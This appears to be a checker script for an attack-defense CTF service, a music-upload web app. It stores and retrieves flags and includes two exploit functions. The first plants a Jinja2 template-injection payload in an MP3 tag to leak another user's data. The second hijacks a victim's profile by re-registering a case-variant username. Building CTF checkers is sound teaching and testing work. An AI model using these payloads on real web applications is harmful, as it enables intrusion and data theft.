"""
CHECKER FUNCTIONS
"""
import enochecker3
import secrets
from typing import Optional

from httpx import AsyncClient

from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import mp3_helper
import utils
import faker
import logging
import eyed3
import string
import random

FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)
checker = Enochecker("t3chn0r4d10", 8001)
app = lambda: checker.app


def setup_logger():
    logger = logging.getLogger("technoradio_logger")
    logger.setLevel(logging.DEBUG)

    # Create a console handler
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)

    # Create a formatter and add it to the handlers
    formatter = logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )
    console_handler.setFormatter(formatter)

    # Add the handler to the logger
    logger.addHandler(console_handler)

    return logger


logger = setup_logger()


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    logger.info("START PUTFLAG")
    length = 16
    letters = string.ascii_letters
    username = "".join(random.choice(letters) for _ in range(length))
    password = str(secrets.token_hex(16))
    filename = username + ".mp3"
    # Creates a malicious mp3 file named "exploit.mp3"
    await mp3_helper.create_mp3(filename)
    await mp3_helper.create_modify_mp3(filename, "Flag", "FindMe", "Techno")
    logger.info("Trying to login...")
    # Register if it is first round otherwise login in
    response = await utils.register_user_and_login(client, username, password, logger)
    logger.info("Admin LOGGED IN")
    # Try to upload mp3 to page
    with open(filename, "rb") as file:
        audio = eyed3.load(filename)
        flag_string = task.flag
        logger.info("SET FLAG TEXT " + flag_string)
        flag = await utils.encode_to_base64(flag_string, logger)
        audio.tag.comments.set("FLAG" + flag + "FLAGEND")
        audio.tag.save()
        files = {"mp3-file": file}
        logger.info("Tries to upload to home")
        response = await client.post("/home", files=files)

        if response.status_code == 200:
            logger.info("UPLOADED FLAG Successfully: " + task.flag)
        else:
            logger.warning("UPLOADING FLAG FAILED!!! " + str(response.status_code))
            raise MumbleException("Upload failed")
        await db.set("info", (username, password, filename))
        # attack info
        return f"{filename}"


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # login and check that file exists
    logger.info("START get flag, try to loggin")
    try:
        username, password, filename = await db.get("info")
    except KeyError:
        raise MumbleException("flag missing")
    await utils.login(client, username, password, logger)
    logger.info("Try getting admin mp3 file")
    response = await client.get("/UPLOAD_FOLDER/" + filename)
    # Find flag in response text
    if response.status_code != 200:
        logger.info("Lookup failed " + response.status_code)
        raise MumbleException("Lookup failed")
    logger.info("SUCCESSFULLY REACHED MP3 file")
    # Find b64 flag
    base_64_flag = await utils.find_string_between_flags(response.text, True)
    # Decode flag
    flag_text = await utils.decode_from_base64(base_64_flag, logger)
    logger.info("Founded flag is " + flag_text)
    # assert_equals(task.flag, flag_text, "Flag don't eqauls current flag")
    if task.flag not in flag_text:
        logger.info("FLAG SHOULD BE " + task.flag)
        raise MumbleException("Wrong flag value")
    logger.info("Successfully got flag!")


@checker.exploit(0)
async def exploit_test(
    searcher: FlagSearcher,
    client: AsyncClient,
    task: ExploitCheckerTaskMessage,
) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")
    filename = task.attack_info
    # Creates a malicious mp3 file
    exploit_file = str(secrets.token_hex(16)) + ".mp3"
    await mp3_helper.create_mp3(exploit_file)
    await mp3_helper.create_modify_mp3(
        exploit_file,
        "Evil",
        "{{ [].__class__.__mro__[1].__subclasses__()[-42].get_comments(html_con, +"
        + filename.replace(".mp3", "+")
        + ") }}",
        "Techno",
    )
    # Evil account credentials
    length = 10
    letters = string.ascii_letters
    username = "".join(random.choice(letters) for _ in range(length))
    password = "".join(random.choice(letters) for _ in range(length))
    # register
    await utils.register_user_and_login(client, username, password, logger)
    file_path = "./" + exploit_file
    # Try to upload mp3 to page
    with open(file_path, "rb") as file:
        files = {"mp3-file": file}
        # Sometimes the upload fails with jinja2.exceptions.UndefinedError: 'type object' has no attribute 'get_details'
        # maybe it is not constantly at the same place.
        # Therefor try twice

        response = await client.post("/home", files=files)

        if response.status_code == 200:
            logger.info("Attack Upload success")
        else:
            logger.warning("Attack upload failed")
            logger.info("Retry once again")
            response = await client.post("/home", files=files)
            if response.status_code == 200:
                logger.info("Attack Upload success")
            else:
                raise MumbleException("Upload failed")

    # Find flag in response text
    base_64_flag = await utils.find_string_between_flags(response.text, True)
    if base_64_flag is None:
        logger.warning("NO FLAG in FILE, Flag b64 text was empty")
        raise MumbleException("NO Flag found")
    logger.info("Text to decode " + base_64_flag)
    flag_text = await utils.decode_from_base64(base_64_flag, logger)
    if flag_text is None:
        logger.warning("NO FLAG in FILE, Flag text was empty")
        raise MumbleException("NO Flag found")
    if flag := searcher.search_flag(flag_text):
        logger.info("SUCCESSFULLY OBTAINED FLAG BY ATTACK: " + flag_text)
        return flag
    logger.warning("NOT the right FLAG in FILE, decoding failed: " + flag_text)
    raise MumbleException("Wrong Flag found")


# Second Flag Store


@checker.putflag(1)
async def putflag_test2(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    logger.info("START PUTFLAG 2")
    length = 24
    letters = string.ascii_letters
    username = "".join(random.choice(letters) for _ in range(length))
    password = str(secrets.token_hex(16))
    logger.info("Trying to login...")
    # Register if it is first round otherwise login in
    response = await utils.register_user_and_login(client, username, password, logger)
    logger.info("Admin LOGGED IN")
    # Write in "festivals" textarea the flag
    data = {
        "bio": "I am a huge fan of Banana Techno",
        "festivals": task.flag,
    }
    response = await client.post(
        "/about_" + username,
        data=data,
    )
    if response.status_code != 200:
        raise MumbleException("Flag store failed")
    await db.set("info", (username, password, ""))
    # attack info
    return f"{username}"


@checker.getflag(1)
async def getflag_test2(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # login and check that file exists
    logger.info("START get flag2 , try to loggin")
    try:
        username, password, filename = await db.get("info")
    except KeyError:
        raise MumbleException("flag missing")
    await utils.login(client, username, password, logger)
    logger.info("Try to get to profile page")
    response = await client.get("/about_" + username)
    # Find flag in response text
    if response.status_code != 200:
        logger.info("Lookup failed " + response.status_code)
        raise MumbleException("Lookup failed")
    logger.info("SUCCESSFULLY REACHED Profile page")
    if task.flag not in response.text:
        logger.info("FLAG SHOULD BE " + task.flag)
        raise MumbleException("Wrong flag value")
    logger.info("Successfully got flag!")


@checker.exploit(1)
async def exploit_test2(
    searcher: FlagSearcher,
    client: AsyncClient,
    task: ExploitCheckerTaskMessage,
) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")
    victim_name = task.attack_info
    # Evil account credentials
    length = 10
    letters = string.ascii_letters
    username = victim_name.lower()
    password = "".join(random.choice(letters) for _ in range(length))
    # register
    await utils.register_user_and_login(client, username, password, logger)

    response = await client.get("/about_" + victim_name)

    if response.status_code == 200:
        logger.info("Attack reaching profile success")
    else:
        raise MumbleException("Attack failed")

    # Find flag in response text
    if flag := searcher.search_flag(response.text):
        return flag
    logger.warning("NOT the right FLAG in Profile")
    raise MumbleException("Wrong Flag found")


################ PUTNOISE, GETNOISE, HAVOC SECTION ###################
def generate_random_string(min_length, max_length):
    # Define the characters to choose from
    characters = string.ascii_letters + string.digits

    # Generate a random length within the specified range
    length = random.randint(min_length, max_length)

    # Generate the random string
    random_string = "".join(random.choice(characters) for _ in range(length))

    return random_string


@checker.putnoise(0)
async def putnoise_file(
    task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> Optional[str]:
    # Create account
    logger.info("START PUTNOISE")
    length = 16
    letters = string.ascii_letters
    username = "".join(random.choice(letters) for _ in range(length))
    password = str(secrets.token_hex(16))
    artist = "".join(random.choice(letters) for _ in range(length))
    title = "".join(random.choice(letters) for _ in range(length))
    filename = username + ".mp3"
    # Creates a malicious mp3 file named "exploit.mp3"
    await mp3_helper.create_mp3(filename)
    await mp3_helper.create_modify_mp3(filename, artist, title, "Techno")
    logger.info("Trying to login...")
    # Register if it is first round otherwise login in
    response = await utils.register_user_and_login(client, username, password, logger)
    logger.info("Admin LOGGED IN")
    # Try to upload mp3 to page
    with open(filename, "rb") as file:
        audio = eyed3.load(filename)
        comment = generate_random_string(1, 16)
        audio.tag.comments.set(comment)
        audio.tag.save()
        files = {"mp3-file": file}
        logger.info("Tries to upload to home")
        response = await client.post("/home", files=files)

        if response.status_code == 200:
            logger.info("UPLOADED FLAG Successfully: ")
        else:
            logger.warning("UPLOADING FLAG FAILED!!! " + str(response.status_code))
            raise MumbleException("Upload failed")
        await db.set("info", (username, password, comment))
        # attack info
        return f"{filename}"


@checker.getnoise(0)
async def getnoise_file(
    task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> Optional[str]:
    # login and check that file exists
    logger.info("START get noise")
    try:
        username, password, comment = await db.get("info")
    except KeyError:
        raise MumbleException("Login failed")
    await utils.login(client, username, password, logger)
    logger.info("Try getting noise mp3 file")
    response = await client.get("/UPLOAD_FOLDER/" + username + ".mp3")
    # Find comment in response text
    if response.status_code != 200:
        logger.info("Lookup failed " + response.status_code)
        raise MumbleException("Lookup failed")
    logger.info("SUCCESSFULLY REACHED MP3 file")

    if comment not in response.text:
        logger.info("FLAG SHOULD BE " + comment)
        raise MumbleException("Wrong flag value")
    logger.info("Successfully got comment!")


@checker.putnoise(1)
async def putnoise_bio(
    task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> Optional[str]:
    logger.info("START PUTNoise")
    length = 24
    letters = string.ascii_letters
    username = "".join(random.choice(letters) for _ in range(length))
    password = str(secrets.token_hex(16))
    logger.info("Trying to login...")
    # Register if it is first round otherwise login in
    response = await utils.register_user_and_login(client, username, password, logger)
    logger.info("NOISE LOGGED IN")
    # Write in "festivals" textarea the flag
    bio = generate_random_string(1, 200)
    festivals = generate_random_string(1, 200)
    data = {
        "bio": bio,
        "festivals": festivals,
    }
    response = await client.post(
        "/about_" + username,
        data=data,
    )
    if response.status_code != 200:
        raise MumbleException("Failed to store")
    await db.set("info", (username, password, bio + "," + festivals))


@checker.getnoise(1)
async def getnoise_bio(
    task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> Optional[str]:
    # login and check that file exists
    logger.info("START get noise , try to loggin")
    try:
        username, password, infos = await db.get("info")
    except KeyError:
        raise MumbleException("flag missing")
    await utils.login(client, username, password, logger)
    logger.info("Try to get to profile page")
    response = await client.get("/about_" + username)
    # Find flag in response text
    if response.status_code != 200:
        logger.info("Lookup failed " + response.status_code)
        raise MumbleException("Lookup failed")
    logger.info("SUCCESSFULLY REACHED Profile page")
    bio, fests = infos.split(",")
    if bio not in response.text and fests not in response.text:
        raise MumbleException("Wrong profile value")
    logger.info("Successfully got noise!")
